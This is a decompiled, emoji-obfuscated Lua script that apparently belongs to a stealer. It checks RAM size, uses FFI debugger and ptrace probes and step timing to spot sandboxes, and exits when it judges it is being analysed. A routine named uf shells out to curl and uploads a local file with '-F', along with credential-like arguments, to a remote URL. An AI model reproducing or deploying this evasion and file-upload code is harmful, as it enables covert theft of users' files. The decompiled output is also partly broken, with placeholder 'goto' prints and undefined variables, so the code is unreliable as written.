    r10_0("🐬🌺🐡🐬🐢🐡🦈🐬🐳🌺🐙🦈🦈🐢", r0_0),
    r10_0("🐬🌋🐡🐠🌈🌴🐡🌋🐳🌴🐚🐠🐡🌈🦀🥥🐢🐢🐠🦈", r0_0),
    r10_0("🐬🐡🐡🌴🐢🦀", r0_0),
    r10_0("🐬🦀🦈🐠🐢🐋🐡🐙🐳🦀🐚🌈", r0_0),
    r10_0("🐬🦀🐡🐬🌈🌈🐡🥥", r0_0),
    r10_0("🐬🐚🐡🦀🌈🌊🦈🐳🐠🐳🐚🐢", r0_0),
    "win%-",
    r10_0("🐬🐬🐡🐬🐢🌋", r0_0),
    r10_0("🌺🌋🐡🐠🌈🐋🦈🌊", r0_0)
  }) do
    local r8_35 = #r0_35
    if r8_35 > 0 then
      r8_35 = r0_35:find(r7_35)
      if r8_35 then
        r8_35 = r10_0("🌺🐋🦈🥥🐢🦀🦈🐳🐬🌈", r0_0)
        local r9_35 = r7_35
        r8_35 = r8_35 .. r9_35
        return r8_35
      end
    end
    r8_35 = #r1_35
    if r8_35 > 0 then
      r8_35 = r1_35:find(r7_35)
      if r8_35 then
        r8_35 = r10_0("🐬🐠🐡🌴🌈🐋🦈🌊🐬🌈", r0_0)
        local r9_35 = r7_35
        r8_35 = r8_35 .. r9_35
        return r8_35
      end
    end
  end
  return nil
end
function r11_0.f3()
  -- line: [288, 308] id: 36
  local r0_36 = tonumber
  local r1_36 = r18_0
  local r2_36 = r12_0
  if r2_36 then
    r2_36 = r10_0("🥥🥥🐳🐠🐋🦈🐠🐳🦈🐳🌴🦈🐠🌺🐚🐠🐋🥥🦈🐡🐚🥥🌊🐚🦈🦈🐋🌴🐬🌊🌊🐬🐬🦀🦈🌴🌺🌋🌴🐠", r0_0) or r10_0("🥥🥥🐳🐠🐋🦈🐳🌋🐡🐬🌴🦈🐳🌺🐚🌋🐋🌺🦈🌈🐚🌺🥥🐬🐡🌈🌋🌴", r0_0)
  else
    print("goto k")
  end
  r1_36 = r1_36(r2_36) or r10_0("", r0_0)
  r0_36 = r0_36(r1_36) or 0
  if r0_36 > 0 then
    r1_36 = r0_36 <= 2
  else
    print("goto l")
  end
  r2_36 = false
  local r3_36 = r12_0
  if r3_36 then
    r3_36 = r15_0(r10_0("🌺🐢🐡🐙🐢🌊🐡🐠🌺🐬🦀🌈🐠🐚🐢🐢🐢🌊🐠🐙🦀🐡🐠🦀🐡🐙🐢🥥🌊🥥🐬🥥🌊🐬🐡🦈🥥🌊🐙🐠🐠🐋🐬🦈🌴🥥🌈🌴🌋🐋🐢🐙🌺🦀🦀🐬🐳🌈🦀🐠🐡🐳🦀🌈🌊🐡🌋🐠🌺🌈🐙🌋🐡🐡🦈🐠🌺🥥🐬🌴🐳🌺🌈🐋🐚🐬🦀🌺🌊🌋🦀🌊🦀🌊🌋🦀", r0_0))
    local r4_36 = tonumber(r3_36:match("TotalVisibleMemorySize=(%d+)") or r10_0("", r0_0))
    if r4_36 and 0 < r4_36 then
      r2_36 = r4_36 / 1024 < 2048
    end
  else
    r3_36 = io.open(r10_0("🐠🌊🦈🌺🌈🌋🐡🌋🐳🌊🐋🌈🦈🌊🦀🌴🐢🐋🐠🐬🌴🐙🐬🐋🐳🦈", r0_0), r10_0("🌺🌴", r0_0))
    if r3_36 then
      local r4_36 = r3_36:read(r10_0("🐠🐡🐡🐬", r0_0)) or r10_0("", r0_0)
      r3_36:close()
      local r5_36 = tonumber(r4_36:match("MemTotal:%s*(%d+)"))
      if r5_36 then
        r2_36 = r5_36 / 1024 < 2048
      end
    end
  end
  if r1_36 then
    r3_36 = r10_0("🐬🐬🐡🌴🌈🐚🐳🌋🐳🌊🐙🐳🐡🐢🌴🌋", r0_0)
    if not r3_36 then
      -- ::label_110::
      if r2_36 then
        r3_36 = r10_0("🐬🐬🐡🌴🌈🐚🐳🌋🐳🐚🐚🐬🦈🌊", r0_0) or nil
      else
        print("goto m")
      end
    end
  else
    print(r1_36)
    print("goto n")
  end
  print(r3_36)
  return r3_36
end
function r11_0.f4()
  -- line: [310, 328] id: 37
  if r12_0 then
    local r0_37 = r17_0({
      r10_0("🥥🦀🌊🐢🌋🐡🐡🐡🐳🌴🐚🐠🦈🥥🌴🥥🌈🦈🐠🐬🦀🌺🌊🌊", r0_0),
      r10_0("🥥🦀🌊🐢🌋🐡🐡🐚🐳🦀🐚🐬🐡🐚🦀🌈🐢🌈🐠🐚🌴🐬🐬🐬🐠🐬🌋🌺", r0_0),
      r10_0("🥥🦀🌊🐢🌋🐡🐳🥥🐠🌊🐚🐬🐡🐙🌴🌋🌋🌋🦈🐋🦀🦈🐬🐚🐳🐠🐢🐠🥥🐳🌊🦀🌺🐚🦈🦀🐬🐢🦀🐢🦈🐋🌊🐡🐙🦈🐋🌋🐋🌋", r0_0),
      r10_0("🥥🦀🌊🐢🌋🐡🐳🌊🐳🦀🐚🌈🦈🥥🌴🌋🌋🌋🐡🌋🌴🐙🐬🌴🐳🐠🌈🐠🌊🐳🐬🌈🥥🦀🐡🐚", r0_0),
      r10_0("🥥🦀🌊🐢🌋🐡🐳🦈🐠🥥🐚🌈🦈🐋🌴🐋🐢🐳🐠🐠🐙🐡🐬🌴🐠🐙🐢🐙🌺🌈🥥🐬🥥🐋🐳🥥🥥🌺🐚🌋🐠🦀🌊🐋", r0_0),
      r10_0("🥥🦀🌊🐢🌋🐡🐳🦈🐠🥥🐚🌈🦈🐋🌴🐋🐢🐳🐠🐠🌈🥥🥥🐋🐳🌺🐢🌺🥥🌊🌺🐬🐬🐬🦈🥥🐬🐢🌴🦈🐡🐳🐠🐳🐚🐚🌈🌈🌈🌈🐢🐚🌺🐬🦀🐬🐳🐬🐚🌺", r0_0)
    })
    print(r0_37)
    if r0_37 then
      return r0_37
    end
  else
    local r0_37 = r17_0({
      r10_0("🐠🌊🐡🐬🐢🐠🐡🐡🐳🐙🐙🐙🐡🐚🦀🥥🌈🦈🐬🐡", r0_0),
      r10_0("🐠🌊🐡🌴🌈🌈🦈🌊🌺🦀🐚🐠🦈🐬🦀🌈🐢🌋🐳🐬🦀🌺🐬🐡🐠🐢🦀🥥", r0_0),
      r10_0("🐠🌊🐡🌴🌈🌈🦈🌊🌺🦀🐚🐡🐡🐢🦀🌋🐢🦀🐠🐡🌴🐚🐠🐬", r0_0),
      r10_0("🐠🌊🐡🌴🌈🌈🦈🌊🌺🦀🐚🐡🦈🦀🌴🐢🐢🌺🐬🐡", r0_0),
      r10_0("🐠🌊🐡🌴🌈🌈🦈🌊🌺🦀🐚🦀🦈🌺🦀🌴🌈🦈🐠🌋🌴🐙🐬🐢🐳🌈🐢🥥🌊🌴🐠🐙", r0_0)
    })
    print(r0_37)
    if r0_37 then
      return r0_37
    end
  end
  return nil
end

print(r10_0(r6_0, r0_0))

local function r42_0()
  -- line: [330, 332] id: 38
  local r0_38 = type(jit)
  if r0_38 == r10_0("🌺🌋🐡🐬🐢🌋🐡🐢🐳🐳", r0_0) then
    r0_38 = jit.f5 and (true or false)
  else
    print(r10_0("🌺🌋🐡🐬🐢🌋🐡🐢🐳🐳", r0_0))
    print("goto o")
  end
  return r0_38
end
local function r43_0()
  -- line: [333, 341] id: 39
  local r0_39, r1_39 = pcall(require, r10_0("🐬🌈🐡🦈🐢🌊", r0_0))
  if not r0_39 then
    return false
  end
  r1_39.f6(r10_0("🐡🌺🐬🐢🦀🌈🥥🦈🌺🐬🐋🐳🦈🦈🦀🐳🌈🐬🐬🐋🐙🐢🌺🐙🦈🐙🐢🌋🥥🐠🌺🐡🌊🐢🐳🐡🥥🦀🐙🐳🦈🐬🌺🦈🌴🐢🐢🌋🌈🌺🐢🦈🐬🐡🐢🦈🐳🌴🌴🥥🐳🦀🦀🦈🐡🐳🐚🌈🌊🦈🌴🐚🌊🐬🌊🐳🐳🌴🐳🐢🐠🥥🌴🐡🌋🐢🌈🐢🌊🥥🐋🐚🌴🌺🌈🐡🐙🌋🐚🥥🐚🦀🐡🐳🦈🥥🌈🐬🌋🐬🐚🦀🦈🐠🐙🐢🌊🐚🌺🐙🐡🐚🌺🌴🐡🐳🐳🐢🐚🌈🥥🌴🦈🌊🥥🌊🐳🐋🐙🌴🐳🌊🐚🌺🌊🐠🐠🐋🌴🥥🌋🦀🌺🌺🦈🌊🦀🥥🌋🌊🐚🦀🌺🐋🌴🦀🐋🐠🐬🐢🦀🦈🌈🐢🐡🐡🐡🐢🐡🐚🐚🦈🐋🐢🐬🐚🌈🦀🐬🌊🐢🐠🌴🐢🐠🐠🐬🌋🦈🦈🥥🥥🌊🐬🐙🐚🐚🌴🌺🌈🐢🐚🐬🌈🦈🐋🌊🦈🐋🐠🌋🥥🥥🐋🐚🐙🐢🐋🐢🌈🥥🐳🥥🦀🐡🐡🐠🐢🐋🌋🌺🦈🐚🐳🐢🥥🐚🐡🥥🐡🐚🐋🦈🐙🐋🌊🐋🐙🌴🌊🌺🌴🌴🥥🐚🥥🐠🐬🦀🐋🦈🐙🌊🌺🐚🐢🐳🥥🐋🐚🐚🐚🥥🌴🌈🌊🌋🐚🌈🌋🐋🌋🦀🌺🌊🌈🌈🌈🐙🐳🥥🌴", r0_0))
  local r2_39 = r1_39.f7(r10_0("🐬🦈🐡🐠🌈🌋🐡🐋🐳🐳🐚🐋🥥🐚🌈🐋", r0_0))
  if r2_39.f8() ~= 0 then
    return true
  end
  local r3_39 = r1_39.f9(r10_0("🐬🐳🐡🦀🌈🌴🐳🐙🐬🌺🌴🌋", r0_0), 0)
  r2_39.f10(r2_39.f11(), r3_39)
  return r3_39[0] ~= 0
end
local function r44_0()
  -- line: [342, 352] id: 40
  local r0_40, r1_40 = pcall(require, r10_0("🐬🌈🐡🦈🐢🌊", r0_0))
  if not r0_40 then
    return false
  end
  r1_40.f6(r10_0("🐠🐙🐡🐚🐢🐳🐡🐋🐳🦈🐋🐳🐡🌴🌴🦀🌈🐡🐠🌋🌴🌺🐬🌈🌺🐬🐢🐠🥥🌋🌺🦈🦈🐙🐠🌊🥥🦀🐙🐡🐳🐳🐬🐬🦀🐚🐢🦀🌴🌋🦀🐋🌺🐢🦀🌺🐳🐙🌈🐚🐠🐡🦀🌈🥥🌋🐙🐚🌺🌈🐋🌺🦈🦀🦈🐙🌺🌈🐳🐢🌺🌴🌴🌋🌋🐡🌈🐢🐡🌈🐋🌺🌋🐡🐢🐳🐚🌊🦀🌋🐙🌴🌊🦈🥥🌈🌈🌺🌋🦀🐚🦀🐠🐳🐋🐬🐡🐋🐳🦀", r0_0))
  if r1_40.f12.f13(0, 0, nil, nil) == -1 then
    return true
  end
  return false
end
function r11_0.f14()
  -- line: [353, 357] id: 41
  if not r12_0 or not r42_0() then
    return false
  end
  local r0_41, r1_41 = pcall(r43_0)
  local r2_41 = nil	-- notice: implicit variable refs by block#[6]
  if r0_41 then
    r2_41 = r1_41
    if r2_41 then
      -- ::label_16::
      r2_41 = false
    end
  else
    print("goto p")
  end
  return r2_41
end
function r11_0.f15()
  -- line: [358, 362] id: 42
  if r12_0 or not r42_0() then
    return false
  end
  print(r44_0)
  local r0_42, r1_42 = pcall(r44_0)
  print(r0_42)
  print(r1_42)
  local r2_42 = nil	-- notice: implicit variable refs by block#[6]
  if r0_42 then
    r2_42 = r1_42
    if r2_42 then
      -- ::label_16::
      r2_42 = false
    end
  else
    print("goto q")
  end
  return r2_42
end
function r11_0.f16(r0_43)
  -- line: [363, 419] id: 43
  if not r0_43 then
    r0_43 = {}
  end
  local r1_43 = {}
  local r2_43 = 0
  local r3_43 = 0
  local r4_43 = 0
  if r11_0.fr() then
    r2_43 = r2_43 + 1
    r20_0(r1_43, r10_0("🐬🌋🐡🐠🐢🌋🦈🥥🐳🦈🌴🌈🦈🐡🦀🐠🐢🐢🐠🥥🐚🐚🌺🦀🐠🌈🐢🌋🌊🐳🐬🐡🌊🥥🐠🐳", r0_0))
    print(r10_0("🐬🌋🐡🐠🐢🌋🦈🥥🐳🦈🌴🌈🦈🐡🦀🐠🐢🐢🐠🥥🐚🐚🌺🦀🐠🌈🐢🌋🌊🐳🐬🐡🌊🥥🐠🐳", r0_0))
  end
  if not r11_0.fs() then
    r11_0.fq()
    if not r11_0.fs() then
      r2_43 = r2_43 + 1
      r20_0(r1_43, r10_0("🌺🌋🦈🌊🐢🌊🦈🦈🐠🦈🐚🐙🐡🐙🦀🌴🌋🐢🐠🌺🌴🐚🐬🐬🐳🌊🌋🥥🌊🥥🐬🥥🌊🌺🐠🌺🥥🦀🐙🐳🐠🐳🐬🌺", r0_0))
      print(r10_0("🌺🌋🦈🌊🐢🌊🦈🦈🐠🦈🐚🐙🐡🐙🦀🌴🌋🐢🐠🌺🌴🐚🐬🐬🐳🌊🌋🥥🌊🥥🐬🥥🌊🌺🐠🌺🥥🦀🐙🐳🐠🐳🐬🌺", r0_0))
    end
  end
  local r6_43, r7_43 = r11_0.ft(r11_0.fa.fb, r11_0.fa.fc)
  if r6_43 then
    r2_43 = r2_43 + 1
    r7_43 = 1
    r20_0(r1_43, ("single_step_slow:%dms"):format(r7_43))
  end
  local r8_43 = r11_0.fw()
  if r8_43 then
    r2_43 = r2_43 + 1
    r20_0(r1_43, r10_0("🐬🐬🦈🐠🐢🐢🐳🌋🐳🐠🐚🐬🦈🐙🌴🌴🐢🌊🐠🌴🌴🦈🌺🐚🐡🦈🐢🐬🥥🐋🐬🦈🥥🐋🐳🐚🥥🦀🌋🐚", r0_0) .. r8_43)
    print(r10_0("🐬🐬🦈🐠🐢🐢🐳🌋🐳🐠🐚🐬🦈🐙🌴🌴🐢🌊🐠🌴🌴🦈🌺🐚🐡🦈🐢🐬🥥🐋🐬🦈🥥🐋🐳🐚🥥🦀🌋🐚", r0_0) .. r8_43)
  end
  if not r12_0 and r11_0.fx() then
    r2_43 = r2_43 + 1
    r20_0(r1_43, r10_0("🐬🐬🐡🌋🐢🐠🦈🥥🐠🌋🌴🌈🐡🌈🌴🐋🐢🐳🐠🌈🌴🦈🌺🐚🐡🦈🐢🐙🌊🥥🌺🦈🌊🐚🐳🥥🥥🥥🐚🥥🐠🐠", r0_0))
    print(r10_0("🐬🐬🐡🌋🐢🐠🦈🥥🐠🌋🌴🌈🐡🌈🌴🐋🐢🐳🐠🌈🌴🦈🌺🐚🐡🦈🐢🐙🌊🥥🌺🦈🌊🐚🐳🥥🥥🥥🐚🥥🐠🐠", r0_0))
  end
  local r9_43 = r11_0.fz()
  if r9_43 then
    r2_43 = r2_43 + 1
    r20_0(r1_43, r10_0("🌺🦀🦈🐠🌈🐋🦈🦈🐳🐋🐚🐡🦈🦈🦀🐠🌈🌺🐳🌈🐚🐚🐬🌈🐳🐡🌈🐢🦈🐙", r0_0) .. r9_43)
    print(r10_0("🌺🦀🦈🐠🌈🐋🦈🦈🐳🐋🐚🐡🦈🦈🦀🐠🌈🌺🐳🌈🐚🐚🐬🌈🐳🐡🌈🐢🦈🐙", r0_0) .. r9_43)
  end
  if r12_0 and r11_0.f14() then
    r2_43 = r2_43 + 1
    r20_0(r1_43, r10_0("🥥🐳🦈🥥🐋🌴🐡🥥🐳🥥🐙🐬🦈🐋🦀🐙🐢🌺🐳🐢🐚🥥🌺🐚🐳🐚🌈🌴🥥🌊🐬🐚🥥🌋", r0_0))
    print(r10_0("🥥🐳🦈🥥🐋🌴🐡🥥🐳🥥🐙🐬🦈🐋🦀🐙🐢🌺🐳🐢🐚🥥🌺🐚🐳🐚🌈🌴🥥🌊🐬🐚🥥🌋", r0_0))
  end
  if not r12_0 and r11_0.f15() then
    r2_43 = r2_43 + 1
    r20_0(r1_43, r10_0("🌺🐙🦈🐳🌈🌋🐡🐡🐳🌊🐚🐬🐠🌺🌴🦀🌈🐡🐠🌋🌴🌺🐬🌈🐳🐳🐢🌋🌺🐋🌺🦈🥥🌴🐳🌋🌊🌈", r0_0))
    print(r10_0("🌺🐙🦈🐳🌈🌋🐡🐡🐳🌊🐚🐬🐠🌺🌴🦀🌈🐡🐠🌋🌴🌺🐬🌈🐳🐳🐢🌋🌺🐋🌺🦈🥥🌴🐳🌋🌊🌈", r0_0))
  end
  local r10_43 = r11_0.fy()
  if r10_43 then
    r3_43 = r3_43 + 1
    r20_0(r1_43, r10_0("🌺🦀🦈🐠🌈🐋🦈🦈🐳🐋🐚🐡🦈🦈🦀🐠🌈🌺🐳🌈🐚🐚🌺🦀🐠🌈🐢🥥🥥🐳🐬🐡🥥🦀🐠🥥🦈🐬", r0_0) .. r10_43)
  end
  local r11_43 = r11_0.f0()
  if r11_43 then
    r4_43 = r4_43 + 1
    r20_0(r1_43, r10_0("🌺🌈🐡🐙🌋🐳🦈🌺🐳🐳🐚🐢🦈🌈🦀🐠🌈🐡🌺🌊", r0_0) .. r11_43)
  end
  local r12_43 = r11_0.f1()
  if r12_43 then
    r4_43 = r4_43 + 1
    r20_0(r1_43, r10_0("🌺🌈🐡🐙🌋🐳🐡🐡🐠🥥🐙🌺🦈🦈🦀🐚🐢🐳🐠🌈🦀🐡🐳🐳", r0_0) .. r12_43)
  end
  local r13_43 = r11_0.f2()
  if r13_43 then
    r3_43 = r3_43 + 1
    r20_0(r1_43, r10_0("🐬🐳🐡🐳🐢🦀🐡🐋🐠🐠🐚🐙🐡🌈🌴🥥🌴🌴", r0_0) .. r13_43)
  end
  local r14_43 = r11_0.f3()
  if r14_43 then
    r3_43 = r3_43 + 1
    r20_0(r1_43, r14_43)
  end
  local r15_43 = r11_0.f4()
  if r15_43 then
    r3_43 = r3_43 + 1
    r20_0(r1_43, r10_0("🌺🦀🐡🐬🐢🐠🐡🌊🐳🥥🐚🌈🐡🐡🐙🐠🌈🐠🐠🌋🦀🐡🐬🦈🐬🥥", r0_0) .. r15_43)
    print(r20_0(r1_43, r10_0("🌺🦀🐡🐬🐢🐠🐡🌊🐳🥥🐚🌈🐡🐡🐙🐠🌈🐠🐠🌋🦀🐡🐬🦈🐬🥥", r0_0) .. r15_43))
  end
  local r16_43 = r2_43 + r3_43 + r4_43
  local r17_43 = r0_43.fe or r11_0.fa.fe
  if r17_43 > r2_43 then
    r17_43 = r3_43 + r4_43
    if (r0_43.fd or r11_0.fa.fd) > r17_43 then
      r17_43 = r0_43.ff or r11_0.fa.ff
      r17_43 = r17_43 <= r16_43
    end
  else
    print("goto q")
  end
  local r18_43 = {
    f17 = r17_43,
    f18 = r16_43,
    f19 = r2_43,
    f20 = r3_43,
    f21 = r4_43,
    f22 = r1_43,
  }
  local r19_43 = r12_0
  if r19_43 then
    r19_43 = r10_0("🌺🐢🐡🌋🐢🐠🐡🌊🐳🦀🐙🥥🐡🐚", r0_0) or r10_0("🌺🐙🐡🌴🌈🐋🐡🌴🐠🌋", r0_0)
    print(r19_43)
  else
    print(" r")
  end
  r18_43.f23 = r19_43
  return r18_43
end
function r11_0.f24(r0_44)
  -- line: [420, 441] id: 44
  if not r0_44 then
    r0_44 = {
      f25 = r10_0("🐬🐋🦈🐋🐢🌊🦈🌊", r0_0),
      f26 = 1,
    }
  end
  local r1_44 = r11_0.f16(r0_44.f27 or {})
  if r1_44.f17 then
    local r2_44 = r0_44.f25 or r10_0("🐬🐋🦈🐋🐢🌊🦈🌊", r0_0)
    if r2_44 == r10_0("🐬🐋🦈🐋🐢🌊🦈🌊", r0_0) then
      print(r0_44.f26 or 1)
    elseif r2_44 == r10_0("🌺🦀🐡🐚🐢🦀🐡🥥🐠🐬", r0_0) then
      if r12_0 then
        print(r15_0(r10_0("🌺🐙🐡🌋🐢🐠🐡🐬🌺🐬🐋🌋🦈🐬🐢🐢", r0_0) .. (r0_44.f28 or 10) .. r10_0("🐠🐙🌊🐬🌴🌋🌊🐬🌺🌴🌋🐳🌊🐬🌈🐢🦀🌈🌺🌋🌈🥥🐳🌺🦈🐡🌋🌋🐬🌈", r0_0)))
        r15_0(r10_0("🌺🐙🐡🌋🐢🐠🐡🐬🌺🐬🐋🌋🦈🐬🐢🐢", r0_0) .. (r0_44.f28 or 10) .. r10_0("🐠🐙🌊🐬🌴🌋🌊🐬🌺🌴🌋🐳🌊🐬🌈🐢🦀🌈🌺🌋🌈🥥🐳🌺🦈🐡🌋🌋🐬🌈", r0_0))
      else
        print(r15_0(r10_0("🌺🦀🐡🐚🐢🦀🐡🥥🐠🐬🐋🐳", r0_0) .. (r0_44.f28 or 10) .. r10_0("🐠🐙🌊🦀🦀🐳🐡🌊🐳🐳🐙🌊🌊🌺🦀🐳🌈🌺🐠🐳🌴🌴🐠🦀🐬🌈🌴🌊🐡🐬🐳🥥", r0_0)))
        r15_0(r10_0("🌺🦀🐡🐚🐢🦀🐡🥥🐠🐬🐋🐳", r0_0) .. (r0_44.f28 or 10) .. r10_0("🐠🐙🌊🦀🦀🐳🐡🌊🐳🐳🐙🌊🌊🌺🦀🐳🌈🌺🐠🐳🌴🌴🐠🦀🐬🌈🌴🌊🐡🐬🐳🥥", r0_0))
      end
      print(r10_0("🐬🌋🐡🐠🐢🐚🦈🐳🐳🌺🐚🌺🦈🐢", r0_0) and r2_44 == r10_0("🐬🥥🐡🌴🐢🐳🦈🦈", r0_0))
    elseif r2_44 ~= r10_0("🐬🌋🐡🐠🐢🐚🦈🐳🐳🌺🐚🌺🦈🐢", r0_0) and r2_44 == r10_0("🐬🥥🐡🌴🐢🐳🦈🦈", r0_0) then
    end
  end
  return r1_44
end
function r11_0.f29()
  -- line: [442, 445] id: 45
  pcall(r11_0.fp)
  pcall(r11_0.fq)
end
if r11_0.f16().f17 then
  print("exit()")
end
local function r46_0(r0_46)
  -- line: [451, 451] id: 46
  return r10_0("🐠🌴", r0_0) .. r0_46:gsub(r10_0("🐠🌴", r0_0), r10_0("🌊🐬🥥🌊", r0_0)) .. r10_0("🐠🌴", r0_0)
end
local function r47_0(r0_47)
  -- line: [452, 452] id: 47
  return r10_0("🐠🐢", r0_0) .. r0_47:gsub(r10_0("🐠🐢", r0_0), r10_0("🐠🐢🥥🐡", r0_0)) .. r10_0("🐠🐢", r0_0)
end
local function r48_0(r0_48)
  -- line: [453, 453] id: 48
  local r2_48 = io.popen(r0_48 .. r10_0("🐠🐙🌊🦀🐢🐠🦈🥥🐳🐙🐋🐳🥥🐙🌈🐳🦀🥥🌺🌋🌈🥥🐠🐋🌺🌴🦀🐚🥥🌊🐬🐬🌊🐠🐳🌴🐡🌈🦀🌋🐡🐢🐠🐳🦀🥥🐢🦈🌴🐠🐢🐙🌺🌺🦀🦈🐠🦈🌈🐚🦈🌋🐚🐙", r0_0)):read(r10_0("🐠🐡🐡🐬", r0_0)) or r10_0("", r0_0)
  print(r0_48 .. r10_0("🐠🐙🌊🦀🐢🐠🦈🥥🐳🐙🐋🐳🥥🐙🌈🐳🦀🥥🌺🌋🌈🥥🐠🐋🌺🌴🦀🐚🥥🌊🐬🐬🌊🐠🐳🌴🐡🌈🦀🌋🐡🐢🐠🐳🦀🥥🐢🦈🌴🐠🐢🐙🌺🌺🦀🦈🐠🦈🌈🐚🦈🌋🐚🐙", r0_0))
  print(r2_48)
  r1_48:close()
  return r2_48:find("OK", 1, true)
end
local function r49_0(r0_49)
  -- line: [454, 454] id: 49
  local r2_49 = io.popen(r0_49 .. r10_0("🐠🐙🌊🌊🌴🐠🥥🌺🐬🌺", r0_0)):read(r10_0("🐠🐡🐡🐬", r0_0)) or r10_0("", r0_0)
  r1_49:close()
  return r2_49
end
function uf(r0_50, r1_50, r2_50, r3_50)
  -- line: [456, 467] id: 50
  local r4_50 = io.open(r0_50, r10_0("🌺🌴🐡🌊", r0_0))
  if not r4_50 then
    return false
  end
  r4_50:close()
  if not r48_0(r10_0("🐬🦀🦈🐠🌈🌋🐡🐢🌺🐬🐋🌋🌊🌊🌴🐚🐢🌺🐳🐢🦀🌺🐬🐡🐳🦈🐢🌊", r0_0)) then
    print("exit()")
    return false, nil, r10_0("🐬🦀🦈🐠🌈🌋🐡🐢🌺🐬🐚🐢🦈🌺🌴🦀🦀🐠🐠🦀🌴🐚🌺🌈🐳🐡🐢🐋", r0_0)
  end
  local r5_50 = 30
  local r8_50, r9_50 = (r49_0(table.concat({
    r10_0("🐬🦀🦈🐠🌈🌋🐡🐢🌺🐬🐋🌋🐡🐚🐙🌋", r0_0),
    r10_0("🐠🌺🥥🐙🐢🐋🐡🌋🐳🌴🐚🐢🦈🐢🦀🌋🌈🐬🐬🐠🦀🐡🐬🐡🐳🐳🐢🌋🥥🐋🌺🐡🥥🌋🌺🌺", r0_0) .. r5_50,
    r10_0("🐠🌺🐡🐙🦀🌈", r0_0) .. r5_50,
    r10_0("🐠🌺🐡🌴🦀🌈🥥🌈", r0_0),
    "-w HTTPSTATUS:%{http_code}",
    r46_0(r1_50)
  }, r10_0("🐠🐙", r0_0))) or r10_0("", r0_0)):match("^(.*)HTTPSTATUS:(%d%d%d)$")
  print(r8_50)
  print(r9_50)
  if not r9_50 then
    print("exit(1)")
  end
  local r11_50 = r49_0(table.concat({
    r10_0("🐬🦀🦈🐠🌈🌋🐡🐢🌺🐬🐋🌋🐡🐚🐙🌋", r0_0),
    r10_0("🐠🌺🥥🐙🐢🐋🐡🌋🐳🌴🐚🐢🦈🐢🦀🌋🌈🐬🐬🐠🦀🐡🐬🐡🐳🐳🐢🌋🥥🐋🌺🐡🥥🌋🌺🌺", r0_0) .. r5_50,
    r10_0("🐠🌺🐡🐙🦀🌈", r0_0) .. r5_50,
    r10_0("🐠🌺🐡🌴🦀🌈🥥🌈", r0_0),
    "-w HTTPSTATUS:%{http_code}",
    r10_0("🐠🌺🦈🐠🦀🌈", r0_0) .. r46_0(r2_50 .. r10_0("🐳🐡", r0_0) .. r3_50),
    "-F " .. r46_0(r10_0("🐬🌈🐡🌋🐢🐡🐡🥥🐬🐚🦀🐳", r0_0) .. r0_50),
    r46_0(r1_50)
  }, r10_0("🐠🐙", r0_0))) or r10_0("", r0_0)
  print(r11_50)
  local r12_50, r13_50 = r11_50:match("^(.*)HTTPSTATUS:(%d%d%d)$")
  if r13_50 then
    local r14_50 = tonumber(r13_50)
    local r15_50 = r14_50
    if r15_50 then
      if r14_50 >= 200 then
        r15_50 = r14_50 < 300
      else
        print("goto s")
      end
    end
    return r15_50, r14_50, r12_50 or r10_0("", r0_0)
  end
  return false, nil, r11_50
end
math.randomseed(os.time() + tonumber((function(r0_51)
  -- line: [470, 483] id: 51
  local r1_51 = r0_51:find("0x", 1, true) or r0_51:find("0X", 1, true)
  if not r1_51 then
    return "0"
  end
  r1_51 = r1_51 + 2
  local r2_51 = r1_51
  while r2_51 <= #r0_51 do
    local r3_51 = r0_51:sub(r2_51, r2_51)
    local r4_51 = nil	-- notice: implicit variable refs by block#[14]
    if ("0" > r3_51 or r3_51 > "9") and ("a" > r3_51 or r3_51 > "f") then
      if r3_51 >= "A" then
        r4_51 = r3_51 <= "F"
      else
        print("goto t")
      end
    else
      print("goto u")
    end
    if not r4_51 then
      break
    end
    r2_51 = r2_51 + 1
  end
  if r2_51 == r1_51 then
    return "0"
  end
  return r0_51:sub(r1_51, r2_51 - 1)
end)(tostring({})), 16) + math.floor(os.clock() * 1000000))
math.random()
math.random()
math.random()
local function r51_0(r0_52)
  -- line: [494, 494] id: 52
  local r1_52 = io.open(r0_52, r10_0("🌺🌴🐡🌊", r0_0))
  if r1_52 then
    r1_52:close()
    return true
  end
  return false
end
local function r52_0(r0_53, r1_53)
  -- line: [496, 500] id: 53
  local r2_53 = r0_53:sub(-1)
  if r2_53 == r10_0("🌊🐬", r0_0) or r2_53 == r10_0("🐠🌊", r0_0) then
    return r0_53 .. r1_53
  end
  return r0_53 .. r10_0("🌊🐬", r0_0) .. r1_53
end
local function r53_0(r0_54)
  -- line: [502, 507] id: 54
  local r1_54 = r0_54
  print(r0_54)
  if type(r1_54) == r10_0("🐬🥥🦈🐠🐢🦈🐡🐳🐳🐳🐙🦈", r0_0) then
    print(r1_54)
    return r1_54 == 0
  end
  if type(r1_54) == r10_0("🐬🌴🐡🌴🐢🐳🐡🐢🐳🐳🐚🐠🦈🐬", r0_0) then
    print(r1_54)
    return r1_54
  end
  return false
end
local function r54_0(r0_55)
  -- line: [509, 511] id: 55
  print(r10_0("🐬🦀🐡🐙🐢🌴🥥🦈🌺🦀🐚🐡🌊🌴🦀🥥🐢🥥🐬🐋🌴🐙🐬🐬🐠🐙🦀🐚🥥🌊🌺🐢🌊🐳🐠🥥🌊🌴🐋🦈🐬🥥", r0_0) .. r0_55 .. r10_0("🐠🌴🥥🌺🐢🦈🐡🐙🐳🐠🐚🐙🐡🐙🐢🐢🦀🐡", r0_0) .. r0_55 .. r10_0("🐠🌴🥥🌺🌴🐠🐡🐋🐠🐳🐚🐋🌊🌴🌈🐋🌴🌈🐬🦀🐢🌊", r0_0))
  return r53_0(r10_0("🐬🦀🐡🐙🐢🌴🥥🦈🌺🦀🐚🐡🌊🌴🦀🥥🐢🥥🐬🐋🌴🐙🐬🐬🐠🐙🦀🐚🥥🌊🌺🐢🌊🐳🐠🥥🌊🌴🐋🦈🐬🥥", r0_0) .. r0_55 .. r10_0("🐠🌴🥥🌺🐢🦈🐡🐙🐳🐠🐚🐙🐡🐙🐢🐢🦀🐡", r0_0) .. r0_55 .. r10_0("🐠🌴🥥🌺🌴🐠🐡🐋🐠🐳🐚🐋🌊🌴🌈🐋🌴🌈🐬🦀🐢🌊", r0_0))
end
local function r55_0(r0_56)
  -- line: [513, 513] id: 56
  print(r10_0("🐠🌴", r0_0) .. r0_56:gsub(r10_0("🐠🌴", r0_0), r10_0("🌊🐬🥥🌊", r0_0)) .. r10_0("🐠🌴", r0_0))
  return r10_0("🐠🌴", r0_0) .. r0_56:gsub(r10_0("🐠🌴", r0_0), r10_0("🌊🐬🥥🌊", r0_0)) .. r10_0("🐠🌴", r0_0)
end
